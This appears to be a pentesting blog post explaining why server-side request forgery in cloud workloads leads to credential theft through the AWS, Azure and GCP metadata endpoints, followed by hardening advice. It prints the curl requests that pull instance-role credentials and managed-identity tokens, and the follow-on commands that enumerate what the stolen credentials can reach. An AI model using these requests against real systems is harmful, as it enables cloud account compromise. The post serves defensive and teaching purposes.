---
title: "SSRF to Cloud Metadata: Stealing IMDS Credentials"
date: 2024-11-19
draft: false
tags: ["SSRF", "IMDS", "Cloud Security", "AWS", "Azure", "GCP"]
categories: ["Pentesting"]
summary: "Why a server-side request forgery in a cloud workload is usually a full credential compromise, and how the three major providers differ."
---

On-premises, an SSRF gets you access to internal HTTP services. In the cloud, it frequently gets you the workload's identity — because every major provider exposes credentials at a well-known link-local address that anything on the instance can reach.

That distinction is the reason SSRF findings are rated much higher in cloud environments than the equivalent finding on a classic network.

## The metadata endpoints

| Provider | Endpoint | Auth required |
| --- | --- | --- |
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv2 requires a token |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` header |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` header |

AWS stands out: IMDSv1 needed no header at all, so a plain GET was enough.

## The AWS case

With IMDSv1, the path to credentials is three requests:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# -> my-instance-role

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-instance-role
# -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

You now have temporary credentials valid for the role attached to the instance. Enumerate what they can do:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
aws iam list-attached-role-policies --role-name my-instance-role
```

The common finding is a role with permissions that far exceed the workload's needs — a web application instance holding `s3:*` on every bucket in the account is a familiar result.

With IMDSv2 the same request fails without a session token, which is why the fix is straightforward:

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-0123456789abcdef0 \
  --http-tokens required \
  --http-endpoint enabled
```

Note `http-endpoint enabled`: the right answer is IMDSv2 required, not metadata disabled. Disabling it breaks SDK credential resolution for everything on the instance.

## The Azure case

Azure's endpoint requires the `Metadata: true` header — trivially added if the SSRF lets you control headers, which most do:

```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

The response contains an access token for the managed identity. With it:

```bash
az account get-access-token
az vm list --query '[].name'
```

Azure's protection is IMDS restrictions on the managed identity combined with Conditional Access — and the practical mitigation is making sure identities are scoped only to what the workload needs.

## Why it's so often critical

An SSRF that reads metadata is not just an information disclosure. The chain is:

1. Read the metadata endpoint.
2. Obtain the workload's credentials.
3. Use those credentials against the provider's API.
4. Pivot to whatever the role can reach — often storage buckets, other instances, and sometimes IAM itself.

Step 3 and 4 are where it stops being an SSRF and becomes an account-level compromise. In cloud environments this often bypasses network segmentation entirely, because the API calls go out to the provider, not across your internal network.

## Hardening that holds

- **Require IMDSv2 on AWS.** One setting, removes the unauthenticated path.
- **Do not attach over-permissive roles.** An instance role with `s3:*` on `*` is the finding that turns a medium SSRF into a critical one.
- **Block SSRF at the egress layer.** An application that has no business reaching `169.254.169.254` should not be able to. Some providers now offer this as a network control.
- **Use workload identity federation** instead of long-lived credentials where possible — short-lived tokens limit the window even if leaked.
- **Log and alert on metadata access from unexpected processes.** The requests are local, but the cloud provider's flow logs and your own agent can see them.

## The general point

The metadata service is a credential store that happens to be reachable by anything on the instance. Treat any SSRF in a cloud workload as credential theft until proven otherwise, and treat the role's permission set as the thing that determines actual impact.
